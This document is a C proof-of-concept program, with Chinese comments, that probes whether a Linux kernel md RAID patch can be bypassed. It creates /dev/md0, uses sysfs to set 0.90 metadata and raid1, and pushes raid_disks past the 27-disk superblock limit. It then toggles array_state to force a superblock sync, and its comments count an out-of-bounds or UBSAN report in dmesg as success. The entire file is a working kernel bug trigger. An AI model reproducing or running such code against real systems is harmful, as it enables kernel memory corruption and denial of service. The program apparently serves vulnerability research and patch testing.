#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>

static int wr(const char *p, const char *v, int *er)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) { if (er) *er = errno; return -1; }
    ssize_t n = write(fd, v, strlen(v));
    int e = errno;
    close(fd);
    if (er) *er = e;
    return n < 0 ? -1 : 0;
}

static long rdnum(const char *p)
{
    char b[64];
    int fd = open(p, O_RDONLY);
    if (fd < 0) return -1;
    int n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) return -1;
    b[n] = 0;
    return atol(b);
}

static void mkdev(int n)
{
    char p[64];
    snprintf(p, sizeof(p), "/dev/md%d", n);
    if (access(p, F_OK) != 0)
        mknod(p, S_IFBLK | 0600, makedev(9, n));
}

static void step(const char *tag, int rc, int e)
{
    printf("%-34s rc=%d errno=%d\n", tag, rc, e);
    fflush(stdout);
}

int main(int argc, char **argv)
{
    int big = argc > 1 ? atoi(argv[1]) : 512;

    printf("=== PATCH_GAP_TEST uid=%d raid_disks=%d ===\n", getuid(), big);
    fflush(stdout);

    mkdev(0);

    int e = 0;

    /* 用 open 创建 mddev（走 create_on_open），便于后续 sysfs 操作 */
    int fd = open("/dev/md0", O_RDWR | O_EXCL);
    step("open /dev/md0", fd, fd < 0 ? errno : 0);
    if (fd < 0) return 1;

    /* 关键：用 metadata_version=0.90 走 super_90 路径
     * 但 0.90 会让 new_dev 要求 superblock。
     * 先试 none，看能否绕过上限检查；再试 0.90
     */
    e = 0; wr("/sys/block/md0/md/metadata_version", "0.90", &e);
    step("metadata_version=0.90", 0, e);
    printf("  meta_now=%ld\n", rdnum("/sys/block/md0/md/metadata_version"));

    e = 0; wr("/sys/block/md0/md/level", "raid1", &e);
    step("level=raid1", 0, e);

    /* ★ 核心测试：raid_disks 能否超过 27 */
    char sz[32];
    snprintf(sz, sizeof(sz), "%d", big);
    e = 0;
    int rc = wr("/sys/block/md0/md/raid_disks", sz, &e);
    step("raid_disks=<big>", rc, e);
    printf("  raid_disks_now=%ld\n", rdnum("/sys/block/md0/md/raid_disks"));

    if (rdnum("/sys/block/md0/md/raid_disks") >= big) {
        printf(">>> OVERRIDE_OK: raid_disks set beyond MD_SB_DISKS(27)\n");
    } else {
        printf(">>> OVERRIDE_BLOCKED\n");
    }
    fflush(stdout);

    /* 绑定成员盘（可能因 0.90 要求 superblock 而失败，失败也继续） */
    e = 0; rc = wr("/sys/block/md0/md/new_dev", "1:0", &e);
    step("new_dev 1:0", rc, e);

    /* 尝试 active 触发 md_update_sb -> super_90_sync */
    e = 0; rc = wr("/sys/block/md0/md/array_state", "active", &e);
    step("array_state=active", rc, e);

    /* 强制更新 superblock 的另一条路：写 array_state=clean 或直接写 super_1_sync */
    e = 0; rc = wr("/sys/block/md0/md/array_state", "clean", &e);
    step("array_state=clean", rc, e);

    e = 0; rc = wr("/sys/block/md0/md/array_state", "clear", &e);
    step("array_state=clear", rc, e);

    printf("=== 若上方 dmesg 出现 UBSAN/OOB 即为绕过成功 ===\n");
    printf("=== PATCH_GAP_TEST done ===\n");
    fflush(stdout);
    close(fd);
    return 0;
}